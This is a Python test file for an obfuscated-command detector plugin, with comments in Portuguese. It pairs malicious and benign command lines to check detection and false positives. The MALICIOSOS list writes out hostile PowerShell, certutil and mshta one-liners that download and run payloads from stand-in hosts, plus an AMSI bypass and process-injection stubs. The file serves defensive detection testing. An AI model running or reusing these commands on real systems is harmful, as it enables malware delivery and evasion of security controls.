"""Testes do motor de ofuscação.

O que importa aqui não é só pegar o comando ofuscado: é NÃO acusar o comando
legítimo. Por isso o teste tem duas listas — `MALICIOSOS` e `BENIGNOS` — e as
duas são verificadas em bloco, do mesmo jeito que a demo do dns-tunnel-detect.
Os benignos são linhas de comando de verdade, do tipo que aparece em qualquer
máquina de desenvolvedor (é onde um detector mal calibrado se denuncia).
"""

import base64

from cidadela_bt.plugin import Severity
from cidadela_bt.plugins.ofuscacao_detect import (
    Amostra,
    OfuscacaoDetect,
    caixa_misturada,
    decodificar_base64,
    normalizar,
    parece_comando,
    pontuar,
    proporcao_simbolos,
)


def _codificar(comando: str) -> str:
    """Igual ao -EncodedCommand do PowerShell: UTF-16LE + base64."""
    return base64.b64encode(comando.encode("utf-16-le")).decode("ascii")


CARGA = ("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1'); "
         "Invoke-Alguma -Alvo local")

MALICIOSOS = [
    # clássico: comando codificado, janela escondida, política ignorada
    f"powershell.exe -nop -w hidden -ep bypass -enc {_codificar(CARGA)}",
    # download e executa na cara limpa
    "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.test/p.ps1')\"",
    # crase quebrando o nome do comando
    "powershell -c \"I`E`X (N`ew-Ob`ject Net.WebCl`ient).Downlo`adString('http://evil.test/x')\"",
    # montagem por código de caractere + join
    "powershell -c \"$a=[char]73+[char]69+[char]88; -join($a) | iex\"",
    # cmd com ^ e fatia de variável de ambiente
    "cmd.exe /c p^o^w^e^r^s^h^e^l^l -c %COMSPEC:~4,1%",
    # LOLBin executando script embutido
    "mshta javascript:a=GetObject('script:http://evil.test/s.sct').Exec();close()",
    # certutil baixando payload
    "certutil.exe -urlcache -split -f http://evil.test/p.exe p.exe",
    # tentativa de cegar o AMSI
    "powershell -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\"",
    # injeção em processo
    "powershell -c \"$k=Add-Type -MemberDefinition $x -Name W -PassThru; "
    "$k::VirtualAlloc(0,0x1000,0x3000,0x40)\"",
    # caixa misturada + formato -f
    "pOwErShElL -c \"('{1}{0}' -f 'EX','I') | .('I'+'EX')\"",
]

BENIGNOS = [
    r"C:\Windows\system32\svchost.exe -k NetworkService -p",
    r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer '
    r"--field-trial-handle=1234,i,5678901234567890123 --mojo-platform-channel-handle=4567 "
    r"--enable-features=SomeFeature,OtherFeature --disable-features=Another /prefetch:1",
    r'"C:\Program Files\nodejs\node.exe" server.js --max-old-space-size=4096 --inspect=9229',
    r'java -Xmx2g -Dfile.encoding=UTF-8 -cp "libs/*;build/classes" com.exemplo.Main --porta 8080',
    "powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\\instalar.ps1",
    "git commit -m 'conserta a mira do robo no round 3'",
    r'"C:\Users\espel\AppData\Local\Programs\Microsoft VS Code\Code.exe" --type=utility '
    r"--utility-sub-type=node.mojom.NodeService --lang=pt-BR --service-sandbox-type=none",
    "python -m cidadela_bt rodar --apenas ofuscacao-detect --json relatorio.json",
    "docker run --rm -v ${PWD}:/app -w /app -e POSTGRES_PASSWORD=segredo postgres:16",
    r"C:\Windows\System32\RuntimeBroker.exe -Embedding",
    "npm install --save-dev @types/node eslint prettier",
    r'"C:\Program Files\Docker\Docker\Docker Desktop.exe" --autostart',
]


# ---- os dois blocos ----
def test_todo_malicioso_e_pego():
    falhas = [(t[:70], pontuar(t).escore) for t in MALICIOSOS
              if pontuar(t).severidade is None]
    assert not falhas, f"passaram sem achado: {falhas}"


def test_nenhum_benigno_e_acusado():
    falhas = [(t[:70], pontuar(t).escore, pontuar(t).resumo()) for t in BENIGNOS
              if pontuar(t).severidade is not None]
    assert not falhas, f"falso positivo: {falhas}"


def test_comando_codificado_e_critico():
    av = pontuar(MALICIOSOS[0])
    assert av.severidade is Severity.CRITICAL
    assert av.decodificado and "DownloadString" in av.decodificado


# ---- trava do sinal fraco ----
def test_heuristica_sozinha_nao_pontua():
    # linha longa, cheia de símbolo e com blob base64, mas sem sinal forte:
    # é o formato de linha de comando de navegador, e não pode virar achado
    ruido = ("app.exe --flag=1 --outro=2 --handle=" + "A1b2C3d4" * 30 +
             " --mais=" + "x" * 200)
    av = pontuar(ruido)
    assert av.severidade is None
    assert av.escore == 0
    assert all(s.forte for s in av.sinais)


def test_fraco_soma_quando_ha_forte():
    base = "powershell -c \"IEX $x\""
    sozinho = pontuar(base).escore
    com_ruido = pontuar(base + " # " + "A1b2C3d4" * 30).escore
    assert com_ruido > sozinho


# ---- decodificação ----
def test_decodifica_utf16le():
    alvo = "Write-Host 'ola mundo'"
    assert decodificar_base64(_codificar(alvo)) == alvo


def test_decodifica_utf8():
    alvo = "echo isso aqui e um comando de teste bem comprido"
    codificado = base64.b64encode(alvo.encode("utf-8")).decode("ascii")
    assert decodificar_base64(codificado) == alvo


def test_binario_nao_e_tratado_como_texto():
    binario = base64.b64encode(bytes(range(256)) * 2).decode("ascii")
    assert decodificar_base64(binario) is None


def test_texto_sem_base64_nao_decodifica():
    assert decodificar_base64("git status") is None


def test_ideograma_nao_passa_por_comando():
    # era o furo: blob base64 de app legítimo abre como ideograma, "imprimível",
    # e virava payload decodificado
    assert parece_comando("IEX (New-Object Net.WebClient)")
    assert not parece_comando("嘃௶硷嘃௶硷嘃௶硷")
    assert not parece_comando("")
    assert not parece_comando("123 456 789")       # sem letra nenhuma


def test_blob_base64_de_app_legitimo_nao_decodifica():
    assert decodificar_base64("--handle=" + "A1b2C3d4" * 30) is None


def test_payload_escondido_suspeito_soma_bonus():
    escondido = _codificar(CARGA)
    limpo = _codificar("Get-Date")
    assert pontuar(f"powershell -enc {escondido}").escore > \
           pontuar(f"powershell -enc {limpo}").escore


def test_recursao_tem_fundo():
    # base64 dentro de base64 dentro de base64 não pode rodar sem parar
    nivel1 = _codificar(CARGA)
    nivel2 = _codificar(f"powershell -enc {nivel1}")
    nivel3 = _codificar(f"powershell -enc {nivel2}")
    av = pontuar(f"powershell -enc {nivel3}")
    assert av.severidade is Severity.CRITICAL


# ---- auxiliares ----
def test_caixa_misturada():
    assert caixa_misturada("dOwNlOaDsTrInG") > 0.5
    assert caixa_misturada("DownloadString Invoke-WebRequest") == 0.0
    assert caixa_misturada("AMSI IEX HTTP") == 0.0


def test_proporcao_simbolos():
    assert proporcao_simbolos("abcdefghij") == 0.0
    assert proporcao_simbolos("$&%#@!^*()") == 1.0


def test_normalizar_agrupa_espacos():
    assert normalizar("a   b \n c") == normalizar("a b c")


def test_texto_vazio_nao_quebra():
    av = pontuar("")
    assert av.escore == 0 and av.severidade is None
    assert pontuar("   ").severidade is None


# ---- agrupamento e dedup ----
def _avaliar(amostras):
    return OfuscacaoDetect()._avaliar(amostras)


def test_comando_repetido_vira_um_achado():
    cmd = MALICIOSOS[1]
    amostras = [Amostra("processo em execução", f"PID {100 + i}", cmd) for i in range(5)]
    achados = _avaliar(amostras)
    assert len(achados) == 1
    assert achados[0].evidencia["ocorrencias"] == 5
    assert len(achados[0].evidencia["origens"]) == 5


def test_pedaco_contido_em_outro_nao_duplica():
    linha = MALICIOSOS[1]
    arquivo = f"# cabecalho do script\n{linha}\nWrite-Host fim\n"
    achados = _avaliar([Amostra("arquivo", "s.ps1", arquivo),
                        Amostra("arquivo", "s.ps1:2", linha)])
    assert len(achados) == 1


def test_achado_traz_escore_e_sinais_na_evidencia():
    achados = _avaliar([Amostra("processo em execução", "PID 42", MALICIOSOS[0])])
    ev = achados[0].evidencia
    assert ev["escore"] >= 60
    assert any(s["regra"] == "comando-codificado" for s in ev["sinais"])
    assert "conteudo_decodificado" in ev


def test_amostra_limpa_nao_gera_achado():
    assert _avaliar([Amostra("processo em execução", "PID 1", BENIGNOS[0])]) == []


# ---- aviso de telemetria cega ----
def test_telemetria_ausente_vira_aviso():
    from cidadela_bt.plugin import Contexto
    ctx = Contexto(so="Windows")
    avisos = OfuscacaoDetect()._avisar_telemetria_cega(
        {"script_blocks": None, "processos_log": None}, ctx)
    assert len(avisos) == 2
    assert all(a.severidade is Severity.INFO for a in avisos)
    assert any("4104" in a.titulo for a in avisos)


def test_peso_fraco_nao_passa_de_metade_do_forte():
    # o caso do teste de campo: um sinal forte (IEX) e muito contexto
    lancador = ('cmd /c ""chcp.com" 65001 >nul & "powershell.exe" -NoProfile -NonInteractive '
                '-ExecutionPolicy Bypass -Command "$s = $env:LAUNCHER_SCRIPT; '
                'Invoke-Expression -Command $s" > "C:\\Users\\x\\AppData\\Local\\Temp\\a.out" 2>&1')
    av = pontuar(lancador)
    assert av.severidade is Severity.MEDIUM, av.escore
    fraco = sum(s.peso for s in av.sinais if not s.forte)
    forte = sum(s.peso for s in av.sinais if s.forte)
    assert fraco > forte // 2                  # havia contexto de sobra...
    assert av.escore == forte + forte // 2     # ...mas só metade entrou


def test_ignorar_suprime_e_conta():
    from cidadela_bt.plugin import Contexto
    ctx = Contexto(opcoes={"ignorar": "assistente_shell_launcher, outra_coisa"})
    amostras = [Amostra("processo em execução", "PID 1",
                        "powershell -c Invoke-Expression $env:ASSISTENTE_SHELL_LAUNCHER_SCRIPT"),
                Amostra("processo em execução", "PID 2", MALICIOSOS[1])]
    mantidas, contagem = OfuscacaoDetect()._filtrar(amostras, ctx)
    assert len(mantidas) == 1 and mantidas[0].recurso == "PID 2"
    assert contagem == {"assistente_shell_launcher": 1}


def test_sem_ignorar_nada_e_suprimido():
    from cidadela_bt.plugin import Contexto
    amostras = [Amostra("processo em execução", "PID 1", MALICIOSOS[1])]
    mantidas, contagem = OfuscacaoDetect()._filtrar(amostras, Contexto())
    assert len(mantidas) == 1 and contagem == {}


def test_telemetria_vazia_nao_e_cegueira():
    # log ligado e com histórico, só sem evento na janela: não é aviso
    from cidadela_bt.plugin import Contexto
    ctx = Contexto(so="Windows")
    avisos = OfuscacaoDetect()._avisar_telemetria_cega(
        {"script_blocks": 0, "processos_log": 12}, ctx)
    assert avisos == []
